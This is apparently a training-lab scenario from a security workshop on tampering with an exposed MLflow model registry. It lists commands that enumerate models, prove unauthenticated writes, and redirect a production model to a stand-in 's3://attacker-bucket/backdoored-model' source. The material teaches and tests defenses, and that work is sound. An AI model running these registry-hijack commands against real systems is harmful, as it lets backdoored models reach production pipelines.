# Scenario 10: Supply Chain Model Tampering

> ★ **Shown at DEF CON RTV** - part of the guided demo/workshop. [All scenarios](index.md)

**Difficulty:** Advanced
**Time:** ~35 minutes
**Prerequisites:** Complete [Scenario 06](scenario-06.md)
**Target:** ailab-ml:5000 (MLflow backend), ailab-ml:8265 (Ray)

## Background

Model supply chain attacks compromise the ML lifecycle at the artifact level. A model stored in
MLflow's registry can be re-registered to point at an attacker-controlled artifact source, and
arbitrary experiments/runs can be injected, both without authentication when the tracking server is
exposed. Model scanning (e.g. `modelscan`) catches known serialization attacks
(pickle/unsafe-deserialization), but a registry-redirect or weight-poisoning backdoor is policy, not
payload.

In this flat lab, `ailab-ml:5000` is the **MLflow platform backend**, directly reachable (the
shadow-AI premise: everything in the estate is exposed). That is a distinct surface from the **gated
MLflow gateway** at `ailab-ds:5000`, which is the credential-chained hop in
[Scenario 06](scenario-06.md)/[08](scenario-08.md) (Basic-auth with Ray-looted creds). Tampering
targets the writable backend.

### Why an attacker cares

MLflow's registry is the source of truth for which model version is "Production." Any deploy or
serving system that promotes and loads "latest Production" trusts that record. If the registry
accepts unauthenticated writes, an attacker controls that source of truth: redirect a production
model to an attacker-controlled artifact URI, or register a backdoored version, and the next deploy
picks it up. The transition stages (Staging to Production) have no approval gate, so there is no
integrity check standing between a malicious write and a live model. This is the artifact-level
equivalent of poisoning a package registry.

### How this connects to the rest of the estate

This scenario is deliberately precise about the boundary between what the tool proves and what is
downstream impact. The write primitive is confirmed on the backend; the poisoned-prediction-in-
production step is not, because the lab hosts no serving layer that auto-loads the latest registry
version. That honesty is the point: you claim the primitive you demonstrated, not the outcome you
did not. The read side (`registry`, `model-artifacts`, `download-artifact`) also connects to the
weight-theft theme, and downloaded artifacts can be risk-scanned with `model-scan`.

## Objective

Enumerate model artifacts, **prove unauthenticated write access** to the registry, and assess
supply-chain risk, while being precise about what the tool proves versus what is downstream impact.

## Commands

```bash
# Read the registry and a model version's artifacts (no auth on the exposed backend)
aipostex mlflow --target http://172.16.50.20:5000 registry
aipostex mlflow --target http://172.16.50.20:5000 model-artifacts --model acme-churn-ensemble --version 1

# Risk-scan a downloaded model file for unsafe serialization
aipostex mlflow --target http://172.16.50.20:5000 download-artifact --run-id <id> --artifact-path model/MLmodel
aipostex model-scan --path ~/mlflow-artifacts/

# Prove write access (mutating): create an experiment + run + parameter
aipostex mlflow --target http://172.16.50.20:5000 tamper-proof --force-exploit

# Prove registry hijack (destructive): register a version that redirects to an attacker source
aipostex mlflow --target http://172.16.50.20:5000 swap-model \
  --model acme-churn-ensemble --source s3://attacker-bucket/backdoored-model \
  --force-exploit
```

## Expected Finding

**Read (enumeration):**

- Registered models with version history and artifact storage URIs
- Transition stages (Staging to Production) with no approval gate
- Model files downloadable for inspection; `model-scan` flags unsafe-serialization risk

**Proven - execution-confirmed write primitive:**

- `tamper-proof` creates an experiment, run, and parameter on the server and reads them back:
  unauthenticated **write** to the tracking store is confirmed.
- `swap-model` registers a new model version pointing at an attacker-controlled `source` URI and
  reads the new version back: registry **redirect/hijack** is confirmed.

```json
{
  "finding_type": "vulnerability",
  "service": "mlflow",
  "detail": "Unauthenticated registry write confirmed (experiment+run created; model version redirected and read back)",
  "models_writable": true,
  "landed": "execution-confirmed",
  "registered_models": ["acme-churn-ensemble", "acme-fraud-bert"]
}
```

**Out of scope (downstream impact, NOT proven here):** the lab has no serving layer that auto-loads
the latest registry version, so this scenario proves the **write/redirect primitive**, not a live
poisoned prediction in production. The real-world impact (a serving system pulling and executing the
trojaned model) follows from the write primitive but is not demonstrated by the tool: claim the
primitive, not the prediction.

## Real-World Impact

Unauthenticated registry write is the foothold for a supply-chain compromise: an attacker redirects a
production model's source or injects a backdoored version, and any pipeline that promotes/serves
"latest Production" without integrity verification (checksums, signing, approval gates) loads it on
the next deploy. The defensive lesson is to gate and sign the registry; the tool here establishes
that the gate is missing.

## Scoring

Run this scenario inside an engagement (`aipostex sessions start supply-chain`), then score what it
captured:

```bash
aipostex engagement merge ~/engagements/supply-chain/findings.jsonl -o ~/engagement.json
python3 ~/lab/scoring/score.py ~/engagement.json --strict
```

**Scoring objective:** confirm a model artifact can be downloaded **and** that `tamper-proof`/`swap-model` land an execution-confirmed write against the registry. (The scorer rewards the proven write primitive; it does not expect a downstream-serving proof, which the lab does not host.)
